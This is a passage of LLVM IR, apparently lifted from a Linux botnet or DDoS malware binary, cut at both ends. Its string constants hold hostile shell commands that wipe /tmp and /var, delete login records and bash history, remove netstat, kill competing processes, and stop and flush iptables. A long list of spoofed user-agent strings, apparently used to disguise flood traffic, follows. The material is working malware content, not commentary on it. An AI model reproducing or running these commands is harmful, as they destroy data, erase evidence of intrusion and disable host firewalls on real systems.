i8]* @global_var_8059b97.602, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059b9f.603, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059ba7.604, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059bb1.605, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059bbd.606, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059bc7.607, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059bd1.608, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059bda.609, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8059be6.610, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059bf7.611, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059c00.612, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059c09.613, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059c13.614, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059c1e.615, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059c27.616, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059c32.617, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059c3d.618, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059c47.619, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059c52.620, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059c5a.621, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059c62.622, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059c6c.623, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059c78.624, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059c82.625, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059c8c.626, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059c95.627, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8059ca1.628, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059cb2.629, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059cbb.630, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059cc4.631, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059cce.632, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059cd7.633, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059ce0.634, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059ceb.635, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059cf6.636, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059d00.637, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059d0b.638, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059d13.639, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059d1b.640, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059d25.641, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059d31.642, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059d3b.643, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059d45.644, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059d4e.645, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8059d5a.646, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059d6b.647, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059d74.648, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059d7d.649, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059d87.650, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059d92.651, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059d9f.652, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059dae.653, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059dbd.654, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059dcb.655, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059dda.656, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059de6.657, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059df2.658, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059e00.659, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059e10.660, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059e1e.661, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059e2c.662, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059e39.663, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8059e49.664, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059e5e.665, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059e6b.666, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059e78.667, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059e86.668, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059e95.669, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80598b8.530, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059e9f.670, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ea9.671, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059eaf.672, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059eb5.673, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ebb.674, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ec1.675, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ec7.676, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ecd.677, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ed3.678, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ed9.679, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059edf.680, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059ee6.681, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059eed.682, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059ef4.683, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059efb.684, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f02.685, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f09.686, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f10.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f17.688, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f1e.689, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f25.690, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f2c.691, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f2f.692, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f32.693, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f35.694, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f38.695, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f3b.696, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f3e.697, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f41.698, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059f44.699, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f47.700, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f4b.701, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f4f.702, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f53.703, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f57.704, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f5b.705, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f5f.706, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f63.707, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f67.708, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f6b.709, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f6f.710, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f73.711, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059f77.712, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f83.713, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f89.714, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f90.715, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f96.716, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f9a.717, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f9e.718, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059fa2.719, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059fa6.720, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059faa.721, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059fae.722, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059fb2.723, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059fb6.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fba.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fbf.726, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fc4.727, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fc9.728, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fce.729, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fd3.730, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fd8.731, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fdd.732, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fe2.733, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059fe7.734, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059fec.735, i32 0, i32 0)]
@global_var_805af48.737 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_805afc9.739 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_805afd8.740 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_805b003.741 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_805b018.742 = constant [22 x i8] c"history -c;history -w\00"
@global_var_805b02e.743 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_805b03c.744 = constant [11 x i8] c"history -c\00"
@global_var_805b047.745 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_805b05e.746 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_805b072.747 = constant [11 x i8] c"history -w\00"
@global_var_805b07d.748 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_805b08e.749 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_805b09c.750 = constant [22 x i8] c"service iptables stop\00"
@global_var_805b0b4.751 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_805b0d8.752 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_805b118.753 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_805b158.754 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_805b1e8.755 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_805b220.756 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_805b240.757 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_805b258.758 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_805b2b0.759 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_805b350.760 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_805b3a4.761 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_805b418.762 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_805b458.763 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_805b510.764 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_805b564.765 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_805b5bc.766 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_805b614.767 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_805b654.768 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_805b69c.769 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_805b6f4.770 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_805b760.771 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_805b7b8.772 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_805b808.773 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_805b82c.774 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_805b887.775 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_805b898.776 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_805b8c8.777 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_805b8ec.778 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_805b90e.779 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_805b928.780 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_805b968.781 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805b9f4.782 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805ba3c.783 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805ba84.784 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805bacc.785 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805bb14.786 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_805bb68.787 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_805bbb8.788 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_805bc24.789 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_805bc78.790 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_805bcd4.791 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_805bd30.792 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_805bd94.793 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_805bdf0.794 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805be4c.795 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805bea8.796 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805bf08.797 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_805bf50.798 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_805bfe8.799 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_805c034.800 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805c080.801 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_805c0d0.802 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_805c118.803 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_805c16c.804 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805c1bc.805 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805c204.806 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805c250.807 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805c29c.808 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805c2e4.809 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805c334.810 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805c384.811 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805c3b8.812 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805c3ec.813 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805c440.814 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_805b0d8.752, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805b118.753, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_805b158.754, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_805b1e8.755, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805b220.756, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_805b240.757, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_805b258.758, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_805b2b0.759, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_805b350.760, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805b3a4.761, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_805b418.762, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_805b458.763, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_805b510.764, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805b564.765, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805b5bc.766, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805b614.767, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805b654.768, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805b69c.769, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_805b6f4.770, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_805b760.771, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805b7b8.772, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805b808.773, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_805b82c.774, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805b887.775, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_805b898.776, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_805b8c8.777, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805b8ec.778, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_805b90e.779, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_805b928.780, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_805b968.781, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805b9f4.782, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805ba3c.783, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805ba84.784, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805bacc.785, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805bb14.786, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805bb68.787, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_805bbb8.788, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805bc24.789, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805bc78.790, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805bcd4.791, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_805bd30.792, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805bd94.793, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805bdf0.794, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805be4c.795, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_805bea8.796, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805bf08.797, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805bf50.798, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805bfe8.799, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805c034.800, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805c080.801, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805c0d0.802, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_805c118.803, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_805c16c.804, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_805c1bc.805, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805c204.806, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805c250.807, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x 